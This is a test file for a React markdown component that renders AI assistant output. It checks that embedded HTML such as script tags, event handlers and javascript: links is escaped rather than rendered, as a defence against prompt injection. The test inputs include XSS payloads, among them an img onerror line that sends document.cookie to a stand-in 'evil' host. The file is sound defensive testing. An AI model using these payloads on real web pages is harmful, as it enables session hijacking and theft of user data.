import { expect, test, describe } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'
import { AssistantMarkdown } from './AssistantMarkdown.jsx'

const render = (md) => renderToStaticMarkup(<AssistantMarkdown>{md}</AssistantMarkdown>)

// AI output is untrusted: disableParsingRawHTML must turn any embedded HTML
// into literal text, so prompt injection can never produce live markup, while
// genuine markdown still renders.
describe('AssistantMarkdown', () => {
  test('renders markdown constructs', () => {
    const html = render('# Title\n\n## Sub\n\n**bold** and `code`\n\n- item\n\n1. first')
    expect(html).toContain('<h1')
    expect(html).toContain('<h2')
    expect(html).toContain('Title')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<code>code</code>')
    expect(html).toContain('<ul')
    expect(html).toContain('<ol')
  })

  test('does not emit a live <script> element', () => {
    const html = render('hello <script>alert(1)</script> world')
    expect(html).not.toContain('<script')
  })

  test('does not emit a live <img> for an onerror payload', () => {
    const html = render('<img src=x onerror="fetch(`//evil/?c=`+document.cookie)">')
    expect(html).not.toContain('<img')
  })

  test('renders a tag carrying an event handler as literal text', () => {
    const html = render('<strong onclick="steal()">x</strong>')
    expect(html).not.toContain('<strong')
    expect(html).toContain('&lt;strong')
  })

  test('strips javascript: hrefs from markdown links', () => {
    const html = render('[click](javascript:alert(1))')
    expect(html).not.toContain('javascript:')
  })
})
